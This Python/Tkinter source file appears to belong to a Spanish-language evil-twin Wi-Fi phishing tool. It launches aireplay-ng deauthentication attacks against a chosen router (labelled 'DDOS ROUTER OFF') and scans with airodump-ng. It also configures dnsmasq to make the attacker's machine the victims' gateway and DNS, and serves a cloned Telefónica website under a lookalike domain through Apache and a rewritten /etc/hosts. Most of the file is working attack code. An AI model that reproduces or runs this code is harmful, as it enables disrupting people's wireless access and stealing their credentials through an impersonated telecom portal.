#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ config_dnsmasq ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def configurar_dnsmasq():
	print("Procesando dnsmasq")
	ip=(ip_pc.get())
	print(ip)	
	print(wlan0)
	os.system("touch /root/wpa2/usr/configuracion_dns_host_conf/dnsmasq.conf")
	file2 = open("/root/wpa2/usr/configuracion_dns_host_conf/dnsmasq.conf","w")
	file2.write('interface='+wlan0+'\n')
	file2.write('dhcp-range=192.168.1.1,192.168.1.25,255.255.255.0,1h'+'\n') # tipo C
	file2.write('dhcp-option=3,'+ip+'\n')
	file2.write('dhcp-option=6,'+ip+'\n')
	file2.write('server=8.8.8.8'+'\n')
	file2.write('log-queries'+'\n')
	file2.write('log-dhcp'+'\n')
	file2.write('listen-address=127.0.0.1'+'\n')
	file2.close()
	time.sleep(1)
	print("ejecutando dnsmasq.conf")													
	conf1=threading.Thread(target=dnsmasq_go, args=())
	conf1.start()
def dnsmasq_go(**datos):
	while True:
		try:
			proceso2=Popen(['x-terminal-emulator', '-e', 'dnsmasq', '-C', '/root/wpa2/usr/configuracion_dns_host_conf/dnsmasq.conf -d'], stdout=PIPE, stderr=PIPE) 
			stdout, stderr=proceso2.communicate()	
			break
		except TypeError:
			MessageBox.showerror("Error", "Ha ocurrido un error inesperado.")
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ DDOS ROUTER OFF ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def attack():
	print("Procesando")
	Bss=(BSSID.get())
	print(Bss)
	print(wlan0)													
	ps2=threading.Thread(target=att , args=(wlan0,Bss,))
	ps2.start()
def att(wlan0,Bss, **datos):
		while True:
			try:
				proceso3=Popen(['x-terminal-emulator', '-e', 'aireplay-ng', '-0', '0', '-a', Bss, wlan0, '--ignore-negative-one'], stdout=PIPE, stderr=PIPE)
				stdout, stderr = proceso3.communicate()	
				break
			except TypeError:
				MessageBox.showerror("Error", "Ha ocurrido un error inesperado.")

def look():
	Channel=(channel.get())
	print(Channel)
	print(Wlan0)
	ps1=threading.Thread(target=scan , args=(wlan0,Channel,))
	ps1.start()
def scan(wlan0,Channel, **datos):
		while True:
			try:		
				process12=Popen(['x-terminal-emulator', '-e', 'airodump-ng', '-c', Channel, wlan0], stdout=PIPE, stderr=PIPE, shell=False)
				stdout, stderr = process12.communicate()
				break
			except TypeError:
				MessageBox.showerror("Error", "Ha ocurrido un error inesperado.")				

#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ESTABLECER CONFIG SERVIDOR~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def server_apache():
	ip=(ip_pc.get())	
	print(ip)
	os.system('ifconfig wlan0mon up '+ip+' netmask 255.255.255.0')
	print("Alogando web en carpeta de destinos")
	os.system("mkdir /var/www/html/telefonica")
	os.system("cp -a /root/wpa2/usr/web-clone/telefonica/. /var/www/html/telefonica")
	os.system("chmod +777 /root/wpa2/usr/web-clone/telefonica/. /var/www/html/telefonica")
	line1="<VirtualHost *:80>"
	line2="		ServerName  tElefOnica.es"
	line3="		ServerAdmin root@telefonica.es"
	line4="		ServerAlias www.tElefOnica.es"
	line5="		DocumentRoot  /var/www/html/telefonica/"
	line6="		DirectoryIndex index.html"
	line7="</VirtualHost>"
	time.sleep(1)
	os.system("touch /etc/apache2/sites-available/telefonica.conf") 
	archivo_conf=open('/etc/apache2/sites-available/telefonica.conf',"w")
	archivo_conf.write(line1+'\n')
	archivo_conf.write(line2+'\n')
	archivo_conf.write(line3+'\n')
	archivo_conf.write(line4+'\n')
	archivo_conf.write(line5+'\n')
	archivo_conf.write(line6+'\n')
	archivo_conf.write(line7+'\n')
	archivo_conf.close()
	time.sleep(1)
	print("Hosts virtuale creado y preparando para lanzamiento")
	
	os.system("a2ensite telefonica.conf")
	
	if os.path.isfile("/etc/apache2/sites-enabled/telefonica.conf"):
		print("El archivo creado y en sites-enabled")
	else:
		print("Fallo al crear el archivo o posicionar el archivo")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~creacion de hosts
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&	
	print("Creando y configurando asosacion ip  Dominios")
	print(str(ip))
	os.system("rm /etc/hosts")
	os.system("touch /etc/hosts")
	line1='127.0.0.1'+'		'+'www.tElefOnica.es'
	line2=ip+'  		'+'www.tElefOnica.es'
	archivo_hosts=open('/etc/hosts','w')
	archivo_hosts.write(line1+'\n')
	archivo_hosts.write(line2+'\n')
	archivo_hosts.close()
	time.sleep(1)
	print("asosacion creada ip y Dominios y enlaces simbolicos")
	os.system("x-terminal-emulator -e python3 /root/wpa2/usr/scrip_server/apache.py")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~creacion de dominio
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&	

#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~RESTABLECER CONFIG SISTEMA~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&


#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~VENTANA LOGGIN~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def loggin():
	if key.get()=='c':
		win_loggin.destroy()
		interfaz()
	else:
		MessageBox.showerror("Error", "Password incorrecto.")
win_loggin=tk.Tk()												   
win_loggin.title("Smp_A")
ox,oy=win_loggin.winfo_screenwidth()/2,win_loggin.winfo_screenheight()/2
win_loggin.geometry("=300x200+%d+%d" % (ox-150,oy-120))
img = PhotoImage(file='/root/wpa2/usr/imagen/ico/3.gif')
win_loggin.tk.call('wm', 'iconphoto', win_loggin._w, img) 
pht1= PhotoImage(file="/root/wpa2/usr/imagen/loging.gif") #foto fondo
lblImagen1=Label(win_loggin,image=pht1).place(x=0,y=0)
key=tk.Entry(win_loggin, show="*")
key.pack(padx=5, pady=5)
win_loggin.bind('<Return>', lambda event=None: bttn0.invoke())
bttn0=tk.Button(win_loggin, text="validar Password", fg="snow", comman=loggin)
bttn0.pack()

win_loggin.mainloop()
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~END LOGGIN~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&